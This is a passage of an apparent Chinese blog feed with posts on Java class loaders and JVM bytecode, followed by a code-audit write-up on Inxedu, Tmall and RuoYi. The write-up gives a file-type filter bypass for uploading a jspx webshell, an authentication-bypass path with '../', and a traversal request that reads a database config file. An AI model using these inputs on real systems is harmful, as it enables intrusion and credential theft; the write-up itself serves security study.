应用之间共享的类比如 Spring、Mybatis。</li><li>每个 Web 应用都会创建一个单独的 <code>WebAppClassLoader</code>，并在启动 Web 应用的线程里设置线程线程上下文类加载器为 <code>WebAppClassLoader</code>。各个 <code>WebAppClassLoader</code> 实例之间相互隔离，进而实现 Web 应用之间的类隔。</li></ul><p>单纯依靠自定义类加载器没办法满足某些场景的要求，例如，有些情况下，高层的类加载器需要加载低层的加载器才能加载的类。</p><p>比如，SPI 中，SPI 的接口（如 <code>java.sql.Driver</code>）是由 Java 核心库提供的，由<code>BootstrapClassLoader</code> 加载。而 SPI 的实现（如<code>com.mysql.cj.jdbc.Driver</code>）是由第三方供应商提供的，它们是由应用程序类加载器或者自定义类加载器来加载的。默认情况下，一个类及其依赖类由同一个类加载器加载。所以，加载 SPI 的接口的类加载器（<code>BootstrapClassLoader</code>）也会用来加载 SPI 的实现。按照双亲委派模型，<code>BootstrapClassLoader</code> 是无法找到 SPI 的实现类的，因为它无法委托给子类加载器去尝试加载。</p><p>再比如，假设我们的项目中有 Spring 的 jar 包，由于其是 Web 应用之间共享的，因此会由 <code>SharedClassLoader</code> 加载（Web 服务器是 Tomcat）。我们项目中有一些用到了 Spring 的业务类，比如实现了 Spring 提供的接口、用到了 Spring 提供的注解。所以，加载 Spring 的类加载器（也就是 <code>SharedClassLoader</code>）也会用来加载这些业务类。但是业务类在 Web 应用目录下，不在 <code>SharedClassLoader</code> 的加载路径下，所以 <code>SharedClassLoader</code> 无法找到业务类，也就无法加载它们。</p><p>如何解决这个问题呢？ 这个时候就需要用到 <strong>线程上下文类加载器（</strong><code>**ThreadContextClassLoader**</code><strong>）</strong> 了。</p><p>拿 Spring 这个例子来说，当 Spring 需要加载业务类的时候，它不是用自己的类加载器，而是用当前线程的上下文类加载器。还记得我上面说的吗？每个 Web 应用都会创建一个单独的 <code>WebAppClassLoader</code>，并在启动 Web 应用的线程里设置线程线程上下文类加载器为 <code>WebAppClassLoader</code>。这样就可以让高层的类加载器（<code>SharedClassLoader</code>）借助子类加载器（ <code>WebAppClassLoader</code>）来加载业务类，破坏了 Java 的类加载委托机制，让应用逆向使用类加载器。</p><p>线程上下文类加载器的原理是将一个类加载器保存在线程私有数据里，跟线程绑定，然后在需要的时候取出来使用。这个类加载器通常是由应用程序或者容器（如 Tomcat）设置的。</p><p><code>Java.lang.Thread</code> 中的<code>getContextClassLoader()</code>和 <code>setContextClassLoader(ClassLoader cl)</code>分别用来获取和设置线程的上下文类加载器。如果没有通过<code>setContextClassLoader(ClassLoader cl)</code>进行设置的话，线程将继承其父线程的上下文类加载器。</p><p>Spring 获取线程线程上下文类加载器的代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cl = Thread.currentThread().getContextClassLoader();</span><br></pre></td></tr></table></figure><p>参考：<a href="https://javaguide.cn/java/jvm/classloader.html#%E6%89%93%E7%A0%B4%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B%E6%96%B9%E6%B3%95">https://javaguide.cn/java/jvm/classloader.html#%E6%89%93%E7%A0%B4%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B%E6%96%B9%E6%B3%95</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> web </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> 安全研究 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jvm和字节码</title>
      <link href="/2024/11/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/jvm%E5%AD%97%E8%8A%82%E7%A0%81/"/>
      <url>/2024/11/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/jvm%E5%AD%97%E8%8A%82%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h2 id="jvm以及字节码介绍"><a href="#jvm以及字节码介绍" class="headerlink" title="jvm以及字节码介绍"></a>jvm以及字节码介绍</h2><h3 id="jvm介绍"><a href="#jvm介绍" class="headerlink" title="jvm介绍"></a>jvm介绍</h3><p>在介绍类加载器（ClassLoader）和其机制之前先介绍JVM，JVM 大致可以划分为三个部分，分别是类加载器（Class Loader）、运行时数据区（Runtime Data Areas）和执行引擎（Excution Engine）。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742453170636-1a944b29-d659-4338-97f3-a18d4ba66d6e.png"></p><p>三个部分具体又是干什么的，可以通过下面这幅图来了解</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742453212427-1aba0a5b-09c7-4d51-9ae4-a8d0b90805a7.png"></p><p>Java程序在运行前需要先编译成<code>class文件</code>，Java类初始化的时候会调用<code>java.lang.ClassLoader</code>加载类字节码，<code>ClassLoader</code>会调用JVM的native方法（<code>defineClass0/1/2</code>）来定义一个<code>java.lang.Class</code>实例，通过上述解释可以知道类的加载就是由java类加载器实现的。</p><h3 id="字节码"><a href="#字节码" class="headerlink" title="字节码"></a>字节码</h3><p>编写一个类文件测试一下，以最简单的helloworld为例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        System.out.println(&quot;hello world&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742454591379-81c06b5a-c7a5-4e54-9781-a66fdf10234b.png"></p><p>运行之后在target&#x2F;classes&#x2F;org&#x2F;example目录下发现了class文件，里面的代码和源码为什么会一样？是因为IDEA默认使用<a href="https://github.com/fesh0r/fernflower">Fernflower</a>（反编译工具）将字节码文件（.class，java源代码编译后的文件）反编译为我们看的懂的java代码，通过view-&gt;show bytecode可以看到字节码</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742454952892-57152fd1-e2db-40aa-a39b-120cbaa24e63.png"></p><p>可以用jclasslib插件</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742455692523-0db3a7ec-39fd-458e-97c1-ed30a3d47346.png"></p><p>字节码并不是机器码，操作系统无法直接识别，需要在操作系统上安装不同版本的 <a href="https://javabetter.cn/jvm/what-is-jvm.html">JVM</a> 来识别。</p><p>通常情况下，我们只需要安装不同版本的 JDK（Java Development Kit，Java 开发工具包）就行了，它里面包含了 JRE（Java Runtime Environment，Java 运行时环境），而 JRE 又包含了 JVM。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742455032057-787ca7bd-f203-4429-971e-9176d21cc0e7.png"></p><p>javap是java内置的反编译工具，用javap -v -p Main.class看一下刚才的class文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">Classfile /Users/apple/Documents/javacode/classloader/target/classes/org/example/Main.class</span><br><span class="line">  Last modified 2025-3-20; size 539 bytes</span><br><span class="line">  MD5 checksum a848fbf47800b5f4f1d56bc08b626ee5</span><br><span class="line">  Compiled from &quot;Main.java&quot;</span><br><span class="line">public class org.example.Main</span><br><span class="line">  minor version: 0</span><br><span class="line">  major version: 52</span><br><span class="line">  flags: ACC_PUBLIC, ACC_SUPER</span><br><span class="line">Constant pool:</span><br><span class="line">   #1 = Methodref          #6.#20         // java/lang/Object.&quot;&lt;init&gt;&quot;:()V</span><br><span class="line">   #2 = Fieldref           #21.#22        // java/lang/System.out:Ljava/io/PrintStream;</span><br><span class="line">   #3 = String             #23            // hello world</span><br><span class="line">   #4 = Methodref          #24.#25        // java/io/PrintStream.println:(Ljava/lang/String;)V</span><br><span class="line">   #5 = Class              #26            // org/example/Main</span><br><span class="line">   #6 = Class              #27            // java/lang/Object</span><br><span class="line">   #7 = Utf8               &lt;init&gt;</span><br><span class="line">   #8 = Utf8               ()V</span><br><span class="line">   #9 = Utf8               Code</span><br><span class="line">  #10 = Utf8               LineNumberTable</span><br><span class="line">  #11 = Utf8               LocalVariableTable</span><br><span class="line">  #12 = Utf8               this</span><br><span class="line">  #13 = Utf8               Lorg/example/Main;</span><br><span class="line">  #14 = Utf8               main</span><br><span class="line">  #15 = Utf8               ([Ljava/lang/String;)V</span><br><span class="line">  #16 = Utf8               args</span><br><span class="line">  #17 = Utf8               [Ljava/lang/String;</span><br><span class="line">  #18 = Utf8               SourceFile</span><br><span class="line">  #19 = Utf8               Main.java</span><br><span class="line">  #20 = NameAndType        #7:#8          // &quot;&lt;init&gt;&quot;:()V</span><br><span class="line">  #21 = Class              #28            // java/lang/System</span><br><span class="line">  #22 = NameAndType        #29:#30        // out:Ljava/io/PrintStream;</span><br><span class="line">  #23 = Utf8               hello world</span><br><span class="line">  #24 = Class              #31            // java/io/PrintStream</span><br><span class="line">  #25 = NameAndType        #32:#33        // println:(Ljava/lang/String;)V</span><br><span class="line">  #26 = Utf8               org/example/Main</span><br><span class="line">  #27 = Utf8               java/lang/Object</span><br><span class="line">  #28 = Utf8               java/lang/System</span><br><span class="line">  #29 = Utf8               out</span><br><span class="line">  #30 = Utf8               Ljava/io/PrintStream;</span><br><span class="line">  #31 = Utf8               java/io/PrintStream</span><br><span class="line">  #32 = Utf8               println</span><br><span class="line">  #33 = Utf8               (Ljava/lang/String;)V</span><br><span class="line">&#123;</span><br><span class="line">  public org.example.Main();</span><br><span class="line">    descriptor: ()V</span><br><span class="line">    flags: ACC_PUBLIC</span><br><span class="line">    Code:</span><br><span class="line">      stack=1, locals=1, args_size=1</span><br><span class="line">         0: aload_0</span><br><span class="line">         1: invokespecial #1                  // Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V</span><br><span class="line">         4: return</span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line 5: 0</span><br><span class="line">      LocalVariableTable:</span><br><span class="line">        Start  Length  Slot  Name   Signature</span><br><span class="line">            0       5     0  this   Lorg/example/Main;</span><br><span class="line"></span><br><span class="line">  public static void main(java.lang.String[]);</span><br><span class="line">    descriptor: ([Ljava/lang/String;)V</span><br><span class="line">    flags: ACC_PUBLIC, ACC_STATIC</span><br><span class="line">    Code:</span><br><span class="line">      stack=2, locals=1, args_size=1</span><br><span class="line">         0: getstatic     #2                  // Field java/lang/System.out:Ljava/io/PrintStream;</span><br><span class="line">         3: ldc           #3                  // String hello world</span><br><span class="line">         5: invokevirtual #4                  // Method java/io/PrintStream.println:(Ljava/lang/String;)V</span><br><span class="line">         8: return</span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line 7: 0</span><br><span class="line">        line 8: 8</span><br><span class="line">      LocalVariableTable:</span><br><span class="line">        Start  Length  Slot  Name   Signature</span><br><span class="line">            0       9     0  args   [Ljava/lang/String;</span><br><span class="line">&#125;</span><br><span class="line">SourceFile: &quot;Main.java&quot;</span><br></pre></td></tr></table></figure><p>看到上面Code：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0: getstatic     #2                  // Field java/lang/System.out:Ljava/io/PrintStream;</span><br><span class="line">3: ldc           #3                  // String hello world</span><br><span class="line">5: invokevirtual #4                  // Method java/io/PrintStream.println:(Ljava/lang/String;)V</span><br><span class="line">8: return</span><br></pre></td></tr></table></figure><p>字节码指令序列通常由多条指令组成，每条指令由一个操作码和若干个操作数构成。</p><ul><li>操作码：一个字节大小的指令，用于表示具体的操作。</li><li>操作数：跟随操作码，用于提供额外信息。</li></ul><p>这段字节码序列的意思是调用 System.out.println 方法打印”Hello World”字符串。下面是详细的解释：</p><p>①、<code>0: getstatic #2 &lt;java/lang/System.out&gt;</code>：</p><ul><li>操作码：getstatic</li><li>操作数：#2</li><li>描述：这条指令的作用是获取静态字段，这里获取的是<code>java.lang.System</code>类的<code>out</code>静态字段，它是一个<code>PrintStream</code>类型的输出流。#2 是一个指向<a href="https://javabetter.cn/jvm/class-file-jiegou.html">常量池</a>的索引，后面在讲类文件结构时会讲到。</li></ul><p>②、<code>3: ldc #3 &lt;Hello World&gt;</code>：</p><ul><li>操作码：ldc</li><li>操作数：#3</li><li>描述：这条指令的作用是从常量池中加载一个常量值（字符串”Hello World”）到操作数栈顶。#3 是一个指向常量池的索引，常量池里存储了字符串”Hello World”的引用。</li></ul><p>③、<code>5: invokevirtual #4 &lt;java/io/PrintStream.println&gt;</code>：</p><ul><li>操作码：invokevirtual</li><li>操作数：#4</li><li>描述：这条指令的作用是调用方法。这里调用的是<code>PrintStream</code>类的<code>println</code>方法，用来打印字符串。#4 是一个指向常量池的索引，常量池里存储了<code>java/io/PrintStream.println</code>方法的引用信息。</li></ul><p>④、<code>8: return</code>：</p><ul><li>操作码：return</li><li>描述：这条指令的作用是从当前方法返回。</li></ul><p>上面的 getstatic、ldc、invokevirtual、return 等就是 <a href="https://javabetter.cn/jvm/zijiema-zhiling.html">字节码指令</a>的操作码。</p><p>可以使用 <a href="https://zh.wikipedia.org/wiki/%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E8%BD%AC%E5%82%A8">hexdump</a>，一个在 Unix 和 Linux 系统中常用的工具，用于以十六进制的形式显示文件的内容，看一下字节码的二进制内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">hexdump -C Main.class</span><br><span class="line">00000000  ca fe ba be 00 00 00 34  00 22 0a 00 06 00 14 09  |�...4.&quot;......|</span><br><span class="line">00000010  00 15 00 16 08 00 17 0a  00 18 00 19 07 00 1a 07  |................|</span><br><span class="line">00000020  00 1b 01 00 06 3c 69 6e  69 74 3e 01 00 03 28 29  |.....&lt;init&gt;...()|</span><br><span class="line">00000030  56 01 00 04 43 6f 64 65  01 00 0f 4c 69 6e 65 4e  |V...Code...LineN|</span><br><span class="line">00000040  75 6d 62 65 72 54 61 62  6c 65 01 00 12 4c 6f 63  |umberTable...Loc|</span><br><span class="line">00000050  61 6c 56 61 72 69 61 62  6c 65 54 61 62 6c 65 01  |alVariableTable.|</span><br><span class="line">00000060  00 04 74 68 69 73 01 00  12 4c 6f 72 67 2f 65 78  |..this...Lorg/ex|</span><br><span class="line">00000070  61 6d 70 6c 65 2f 4d 61  69 6e 3b 01 00 04 6d 61  |ample/Main;...ma|</span><br><span class="line">00000080  69 6e 01 00 16 28 5b 4c  6a 61 76 61 2f 6c 61 6e  |in...([Ljava/lan|</span><br><span class="line">00000090  67 2f 53 74 72 69 6e 67  3b 29 56 01 00 04 61 72  |g/String;)V...ar|</span><br><span class="line">000000a0  67 73 01 00 13 5b 4c 6a  61 76 61 2f 6c 61 6e 67  |gs...[Ljava/lang|</span><br><span class="line">000000b0  2f 53 74 72 69 6e 67 3b  01 00 0a 53 6f 75 72 63  |/String;...Sourc|</span><br><span class="line">000000c0  65 46 69 6c 65 01 00 09  4d 61 69 6e 2e 6a 61 76  |eFile...Main.jav|</span><br><span class="line">000000d0  61 0c 00 07 00 08 07 00  1c 0c 00 1d 00 1e 01 00  |a...............|</span><br><span class="line">000000e0  0b 68 65 6c 6c 6f 20 77  6f 72 6c 64 07 00 1f 0c  |.hello world....|</span><br><span class="line">000000f0  00 20 00 21 01 00 10 6f  72 67 2f 65 78 61 6d 70  |. .!...org/examp|</span><br><span class="line">00000100  6c 65 2f 4d 61 69 6e 01  00 10 6a 61 76 61 2f 6c  |le/Main...java/l|</span><br><span class="line">00000110  61 6e 67 2f 4f 62 6a 65  63 74 01 00 10 6a 61 76  |ang/Object...jav|</span><br><span class="line">00000120  61 2f 6c 61 6e 67 2f 53  79 73 74 65 6d 01 00 03  |a/lang/System...|</span><br><span class="line">00000130  6f 75 74 01 00 15 4c 6a  61 76 61 2f 69 6f 2f 50  |out...Ljava/io/P|</span><br><span class="line">00000140  72 69 6e 74 53 74 72 65  61 6d 3b 01 00 13 6a 61  |rintStream;...ja|</span><br><span class="line">00000150  76 61 2f 69 6f 2f 50 72  69 6e 74 53 74 72 65 61  |va/io/PrintStrea|</span><br><span class="line">00000160  6d 01 00 07 70 72 69 6e  74 6c 6e 01 00 15 28 4c  |m...println...(L|</span><br><span class="line">00000170  6a 61 76 61 2f 6c 61 6e  67 2f 53 74 72 69 6e 67  |java/lang/String|</span><br><span class="line">00000180  3b 29 56 00 21 00 05 00  06 00 00 00 00 00 02 00  |;)V.!...........|</span><br><span class="line">00000190  01 00 07 00 08 00 01 00  09 00 00 00 2f 00 01 00  |............/...|</span><br><span class="line">000001a0  01 00 00 00 05 2a b7 00  01 b1 00 00 00 02 00 0a  |.....*........|</span><br><span class="line">000001b0  00 00 00 06 00 01 00 00  00 05 00 0b 00 00 00 0c  |................|</span><br><span class="line">000001c0  00 01 00 00 00 05 00 0c  00 0d 00 00 00 09 00 0e  |................|</span><br><span class="line">000001d0  00 0f 00 01 00 09 00 00  00 37 00 02 00 01 00 00  |.........7......|</span><br><span class="line">000001e0  00 09 b2 00 02 12 03 b6  00 04 b1 00 00 00 02 00  |.............|</span><br><span class="line">000001f0  0a 00 00 00 0a 00 02 00  00 00 07 00 08 00 08 00  |................|</span><br><span class="line">00000200  0b 00 00 00 0c 00 01 00  00 00 09 00 10 00 11 00  |................|</span><br><span class="line">00000210  00 00 01 00 12 00 00 00  02 00 13                 |...........|</span><br><span class="line">0000021b</span><br></pre></td></tr></table></figure><p>ca fe ba be就是.class,字节码的二进制内容对应为这里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b2 00 02 12 03 b6 00 04 b1</span><br></pre></td></tr></table></figure><p>注意：这里是二进制文件的 16 进制表示，也就是 hex，一般分析二进制文件都是以 hex 进行分析。字节码指令和二进制之间的对应关系，以及对应的语义如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0xb2   getstatic       获取静态字段的值</span><br><span class="line">0x12   ldc             常量池中的常量值入栈</span><br><span class="line">0xb6   invokevirtual   运行时方法绑定调用方法</span><br><span class="line">0xb1   return          void 方法返回</span><br></pre></td></tr></table></figure><p>JVM 就是靠解析这些字节码指令来完成程序执行的。常见的执行方式有两种，一种是解释执行，对字节码逐条解释执行；一种是 <a href="https://javabetter.cn/jvm/jit.html">JIT</a>，也就是即时编译，它会在运行时将热点代码优化并缓存起来，下次再执行的时候直接使用缓存起来的机器码，而不需要再次解释执行。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742456275516-5262c48b-f50f-42ab-808b-a72e7c353a97.png"></p><p>这样就可以提高程序的执行效率。</p><p>注意，当<a href="https://javabetter.cn/jvm/class-load.html">类加载器</a>完成字节码数据加载任务后，JVM 划分了专门的内存区域来装载这些字节码数据以及运行时中间数据。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> web </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> 安全研究 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java代码审计-文件上传</title>
      <link href="/2024/11/02/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2024/11/02/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="文件安全-上传-下载-读取-写入等"><a href="#文件安全-上传-下载-读取-写入等" class="headerlink" title="文件安全-上传&amp;下载&amp;读取&amp;写入等"></a>文件安全-上传&amp;下载&amp;读取&amp;写入等</h1><p>1、搜索类别：业务关键字&amp;相关操作类&amp;封装关键字</p><p>2、功能点也适用，直接找文件操作功能进行代码追溯</p><p>newFile(</p><p>String path</p><p>String fileName</p><p>newFileInputStream(</p><p>newFileOutputStream(</p><p>newFileReader</p><p>response.setContentType(“application&#x2F;octet-stream;</p><p>file.delete();</p><p>FileUtils.</p><p>newZipEntity(</p><p>file.getName(</p><p>.unzip(</p><p>.mkdirs(</p><p>stream.write(</p><p>save2File(</p><p>fos、fis.close()</p><p>MultipartFile(</p><p>file.getOriginalFilename(</p><p>IOUtil</p><p>FileUtil</p><p>download</p><p>fileName</p><p>filePath</p><p>write</p><p>getFile</p><p>getPath</p><p>getWriter</p><p>上传 &#x2F;&#x2F; 搜注释</p><p>下载 &#x2F;&#x2F; 搜注释</p><p>……..</p><h2 id="文件上传-Inxedu"><a href="#文件上传-Inxedu" class="headerlink" title="文件上传-Inxedu"></a>文件上传-Inxedu</h2><p>功能点-&gt;前台上传-&gt;ImageUploadController.class-&gt;gok4-&gt;fileType-&gt;jspx</p><p>&#x2F;image&#x2F;gok4?&amp;param&#x3D;temp&amp;fileType&#x3D;jspx,jpg,gif,png,jpeg</p><p>修改配置</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719068893048-2503cfef-9c3a-461a-acc9-7c09baacbd99.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719068930224-3a64836b-e172-4623-bd96-5d68e37c6aee.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719069005095-f2f9fe37-4bc9-4d95-b566-7ad5d962ce0a.png"></p><p>先上后台随便找个用户，登陆</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719069078849-4b0abd19-5061-4eab-8095-8395fd4e75f0.png"></p><p>上传头像</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719069212259-debbc115-311c-493e-98af-ee9a1ad9808a.png"></p><p>抓包，提取上传数据包</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719069326872-b4193e2b-73ba-49a9-af7b-b1da7a363c33.png"></p><p><a href="http://127.0.0.1:8282/image/gok4?&param=temp&fileType=jpg,gif,png,jpeg">http://127.0.0.1:8282/image/gok4?&amp;param=temp&amp;fileType=jpg,gif,png,jpeg</a></p><p>搜上面的路径信息，没找到相关类，猜测被封装到jar包中，找配置文件看jar被打包到哪里</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719070033758-cdd4ecef-2a8a-4ce2-a9f5-83ebd59184ae.png"></p><p>找到路由路径</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719070112741-acacfcfc-56a1-4ad2-a6b2-ca9b99f5fc86.png"></p><p>判断大小和判断文件上传类型fileType&#x3D;jpg,gif,png,jpeg，将前端改为fileType&#x3D;jspx,jpg,gif,png,jpeg</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719070525953-f23a8ffe-4124-428b-a4a3-30f1664c5765.png"></p><p>getSuffix跟进去发现该函数是获取文件名最后一个.之后的后缀，再回到之前代码，判断后缀名，不为jsp才执行接下来的流程</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719070745710-e3e6e95d-bf97-4e5b-93e8-ed03698e226e.png"></p><p>思路直接上传jspx后门，上哥斯拉</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719070995094-fda056b6-1b84-45bb-9a8e-ba6fcb3f4868.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719071449393-abb607cf-cf5f-459d-ae29-a1bf93f29079.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719071466110-e0e7ec65-730c-430f-a2fe-864e568c7d82.png"></p><p>后台配置环境时记得修改上传权限</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719071612102-80b02309-7b22-414b-9bdd-0d6c8576e76c.png"></p><h2 id="配合过滤器上传-Tmall"><a href="#配合过滤器上传-Tmall" class="headerlink" title="配合过滤器上传-Tmall"></a>配合过滤器上传-Tmall</h2><p>1、搜newFile(-&gt;filePath-&gt;fileName-&gt;extension-&gt;originalFileName-&gt;file</p><p>2、AdminPermissionFilter.java-&gt;doFilter-&gt;contains(“&#x2F;admin&#x2F;login”)</p><p>&#x2F;admin&#x2F;login&#x2F;..&#x2F;..&#x2F;tmall&#x2F;admin&#x2F;uploadAdminHeadImage</p><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>搜关键字</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719073243743-4de99772-f3f8-4ac0-8640-cf25a9704be4.png"></p><p>跟进去发现后端文件没有过滤</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719073485815-095c0b56-d12b-46bc-8324-1f8925442ab7.png"> 前端有过滤，抓个包修改后缀绕过就行。</p><h3 id="鉴权漏洞"><a href="#鉴权漏洞" class="headerlink" title="鉴权漏洞"></a>鉴权漏洞</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719074030094-1892f6f1-25e9-4bb7-8689-4a7f81872c0a.png"></p><p>这里代码有逻辑鉴权漏洞，只要url包含&#x2F;admin&#x2F;login就不鉴权了</p><p>&#x2F;admin&#x2F;login&#x2F;..&#x2F;..&#x2F;tmall&#x2F;admin&#x2F;uploadAdminHeadImage</p><p>这样就可以配合前面的上传漏洞</p><h2 id="文件下载-Ruoyi"><a href="#文件下载-Ruoyi" class="headerlink" title="文件下载-Ruoyi"></a>文件下载-Ruoyi</h2><p>搜FileInputStream-&gt;writeBytes-&gt;resourceDownload-&gt;resource</p><p>common&#x2F;download&#x2F;resource?resource&#x3D;&#x2F;profile&#x2F;..&#x2F;RuoYi-v4.5.0&#x2F;ruoyi-admin&#x2F;src&#x2F;main&#x2F;resources&#x2F;application-druid.yml</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719131580668-3f95b971-4d95-4809-8e3b-056616c07191.png"></p><p>如果不确定路径变量名是什么可以打印看一下</p><h2 id="文件读取-Oasys"><a href="#文件读取-Oasys" class="headerlink" title="文件读取-Oasys"></a>文件读取-Oasys</h2><p>搜索new 